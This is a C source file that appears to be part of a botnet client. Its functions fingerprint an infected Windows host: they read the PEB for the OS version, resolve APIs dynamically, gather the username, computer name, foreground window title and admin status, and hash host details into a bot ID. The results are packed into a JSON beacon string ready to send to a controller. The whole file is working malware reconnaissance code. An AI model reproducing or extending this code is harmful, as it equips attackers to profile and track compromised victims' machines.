#include "main.h"

static char unableGet[] = "unable get";

static DWORD crc(WCHAR* Buffer, DWORD vSizeWide){
	DWORD vBufferHash;
	DWORD vCurrentByte;

	vBufferHash = 0;
	if (vSizeWide > 0){
		do{
			vCurrentByte = *Buffer++;
			vBufferHash = 0x1000193 * (vCurrentByte ^ vBufferHash);
			--vSizeWide;
		}
		while(vSizeWide);
	}
	return vBufferHash;
}

static void GetUsername(char* userName){
	DWORD bufCharCount = MAX_PATH * sizeof(wchar_t);
	if (!API(ADVAPI32,GetUserNameA)(userName, &bufCharCount)){
		 strCpyA(userName, unableGet);
	}
}

static void GetComputername(char* compName){
	DWORD bufCharCount = MAX_PATH * sizeof(wchar_t);
	if (!API(KERNEL32,GetComputerNameA)(compName, &bufCharCount)){
		 strCpyA(compName, unableGet);
	}
}


OsVerStruct GetOsVer(){
	OsVerStruct ver;
	_PEB* pPEB = (_PEB*)__readfsdword(0x30);
	ver.dwMajor = pPEB->dwOSMajorVersion;
	ver.dwMinor = pPEB->dwOSMinorVersion;
	ver.dwBuild = pPEB->wOSBuildNumber;
	API(KERNEL32, IsWow64Process)((HANDLE)-1, &ver.isX64);
	return ver;
}

static void Get_ActiveWindow(CHAR* activeWindow){
	HWND hwnd = API(USER32,GetForegroundWindow)();
	if (!hwnd){
		strCpyA(activeWindow, unableGet);
		return;
	}
	if (!API(USER32, GetWindowTextA)(hwnd, activeWindow, MAX_PATH * sizeof(wchar_t))){
		strCpyA(activeWindow, unableGet);
	}
}

static void IsAdmin(char* isAdmin){
	BOOL fInAdminGroup = FALSE;
	HANDLE hToken = NULL;
	HANDLE hTokenToCheck = NULL;
	DWORD cbSize = 0;
	OsVerStruct osver;

	if (!API(ADVAPI32,OpenProcessToken)((HANDLE)-1, TOKEN_QUERY | TOKEN_DUPLICATE,  &hToken)) goto Cleanup;

	_PEB* pPEB = (_PEB*)__readfsdword(0x30);
	osver.dwMajor = pPEB->dwOSMajorVersion;

	if (osver.dwMajor >= 6) { 

		TOKEN_ELEVATION_TYPE elevType;
		if (!API(ADVAPI32,GetTokenInformation)(hToken, TokenElevationType, &elevType, sizeof(elevType), &cbSize)) goto Cleanup;
		if (TokenElevationTypeLimited == elevType) {
			if (!API(ADVAPI32,GetTokenInformation)(hToken, TokenLinkedToken, &hTokenToCheck,
				sizeof(hTokenToCheck), &cbSize)) goto Cleanup;
		}
	}
	if (!hTokenToCheck) {
		if (!API(ADVAPI32,DuplicateToken)(hToken, SecurityIdentification, &hTokenToCheck))
			goto Cleanup;
	}
	BYTE adminSID[SECURITY_MAX_SID_SIZE];
	cbSize = sizeof(adminSID);
	if (!API(ADVAPI32,CreateWellKnownSid)(WinBuiltinAdministratorsSid, NULL, &adminSID,
		&cbSize)) goto Cleanup;

	if (!API(ADVAPI32,CheckTokenMembership)(hTokenToCheck, &adminSID, &fInAdminGroup))
		goto Cleanup;

Cleanup:
	if (hToken) {
		API(KERNEL32,CloseHandle)(hToken); 
		hToken = NULL;
	}
	if (hTokenToCheck) {
		API(KERNEL32,CloseHandle)(hTokenToCheck);
		hTokenToCheck = NULL;
	}
	if (fInAdminGroup){
		strCpyA(isAdmin,"YES");
	}
	else{
		strCpyA(isAdmin,"NO");
	}
}

BotInfoStruct* GetBotInfo(){
	BotInfoStruct* botInfo = (BotInfoStruct*) hAlloc(sizeof(BotInfoStruct));
	if (!botInfo) {
		return NULL;
	}
	botInfo->osVer = GetOsVer();
	GetUsername(botInfo->userName);
	GetComputername(botInfo->compName);
	Get_ActiveWindow(botInfo->activeWindow);
	IsAdmin(botInfo->isAdmin);
	return botInfo;
}

static DWORD x_Init(){
	WCHAR Buffer[128];
	DWORD nSize, pcbBuffer, vSizeWide;
	BOOL v0, v1;

	nSize = 128;
	v0 = API(KERNEL32,GetComputerNameExW)(ComputerNameDnsFullyQualified, Buffer, &nSize);
	nSize &= -v0;
	pcbBuffer = 128 - nSize;
	v1 = API(ADVAPI32, GetUserNameW)(&Buffer[nSize], &pcbBuffer);
	vSizeWide = mywcslen(Buffer);
	return crc(Buffer, vSizeWide);
}

char* systemFunction(){
	DWORD pid;
	DWORD res;
	char* buf = hAlloc(650); 

	memoryset(buf, 0, 650);
	res = x_Init();
	botIdbuf = res;
	pid = API(KERNEL32,GetCurrentProcessId)();
	BotInfoStruct* botInfo = GetBotInfo();

	mysprintf(buf, "{\"id\":\"%u\",\"pid\":\"%d\",\"win\":\"%d.%d %d\",\"isX64\":\"%d\",\"user\":\"%s\",\"comp\":\"%s\",\"actwin\":\"%s\",\"AdminGroup\":\"%s\"}",
		res, pid, botInfo->osVer.dwMajor, botInfo->osVer.dwMinor, botInfo->osVer.dwBuild, botInfo->osVer.isX64,botInfo->userName, botInfo->compName,botInfo->activeWindow, botInfo->isAdmin);
	memoryset(botInfo, 0, sizeof botInfo);
	hFree(botInfo);
	return buf;
}
